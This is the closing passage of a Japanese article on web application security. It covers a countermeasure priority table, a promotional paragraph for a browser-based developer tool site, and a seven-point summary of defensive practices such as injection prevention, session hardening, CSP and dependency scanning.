| DOMPurify | 高 | 低 | Stored/DOM XSS防御 |
| 2FA（TOTP） | 中 | 中 | アカウント乗っ取り防止 |
| npm audit / Dependabot | 中 | 低 | 既知脆弱性の管理 |
| OWASP ZAP スキャン | 中 | 中 | 脆弱性の自動検出 |
| 監査ログ | 中 | 中 | インシデント調査 |

---

## 開発ツールで効率的なセキュリティテストを

セキュリティテスト・デバッグ作業では、**[DevToolBox（usedevtools.com）](https://usedevtools.com/)** が役立ちます。JWTトークンのデコード・署名検証・クレーム確認をブラウザ上で即座に実行できるJWT Inspector、APIレスポンスの構造確認に使えるJSON Validator/Formatter、URLエンコード/デコードツールなど、セキュリティ開発で日常的に使うユーティリティが一か所にまとまっています。特にJWT認証の実装テスト時に、トークンのペイロードや有効期限を素早く確認できるのは実務でも重宝します。ブラウザさえあれば使えるためサーバーへの情報持ち込みリスクもなく、開発環境での運用に適しています。

---

## まとめ

Webセキュリティは「完璧な状態」に達することはなく、継続的な取り組みが求められます。本記事で紹介した内容を整理すると：

1. **OWASP Top 10 を把握する** — 業界共通言語でリスクを分類・優先度付け
2. **インジェクション対策の徹底** — Prepared Statements・ORM・入力検証を組み合わせる
3. **認証・セッションの堅牢化** — bcrypt・HttpOnly Cookie・セッション再生成・2FA
4. **ブラウザセキュリティの活用** — CSP・HSTS・SameSite Cookieで多層防御
5. **依存関係の継続的監視** — npm audit・Dependabot で既知脆弱性を早期対処
6. **自動化されたセキュリティテスト** — CI/CDにZAPスキャンを組み込む
7. **監査ログの整備** — インシデント発生時に追跡できる記録を残す

セキュリティは後付けではなく、設計段階から「Security by Design」として組み込むことが、最もコスト効率の高いアプローチです。本記事のコードサンプルを参考に、まず優先度の高い対策から順に実装を進めてください。

